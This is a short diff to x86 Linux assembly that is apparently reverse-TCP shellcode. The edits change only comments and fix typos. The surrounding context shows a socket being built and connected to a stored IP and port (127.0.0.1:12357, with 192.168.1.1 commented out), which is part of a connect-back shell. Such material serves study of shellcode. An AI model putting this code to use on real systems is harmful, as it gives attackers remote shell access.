@@ -37,7 +37,7 @@ _start:
 ; socket(PF_NETLINK, SOCK_RAW, 0)         = 3
 ; bind(3, {sa_family=AF_NETLINK, pid=0, groups=00000000}, 12) = 0
 ;
-; Below starts what we were looking for:
+; Here is a part we were looking for:
 ;
 ; socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
 ; connect(3, {sa_family=AF_INET, sin_port=htons(12357), sin_addr=inet_addr("127.0.0.1")}, 16) = -1 EINPROGRESS (Operation now in progress)
@@ -76,7 +76,7 @@ _start:
         push BYTE 1             ; SOCK_STREAM   ||	int type,
         push BYTE 2             ; AF_INET	|| socket(int domain,
         mov ecx, esp            ; ECX - PTR to arguments for socket()
-        int 0x80
+        int 0x80		; sockfd will be stored in EAX after this call
 
         ; EAX return
         mov esi, eax            ; save socket fd in ESI for later
@@ -109,7 +109,7 @@ back2shellcode:
 ;	push DWORD 0x0101a8c0	; 192.168.1.1 in reverse
 	push DWORD [edi]	; push IP
 	push WORD [edi+0x4]	; push port
-	dec ebx			; decreaes bl from 3 to 2 to use for the next push
+	dec ebx			; decrease bl from 3 to 2 to use it in the next push
 	push WORD bx		; 2 - AF_INET
 	inc ebx			; put back bl to 3 for SYS_CONNECT
 	mov ecx, esp		; ptr to struct sockaddr
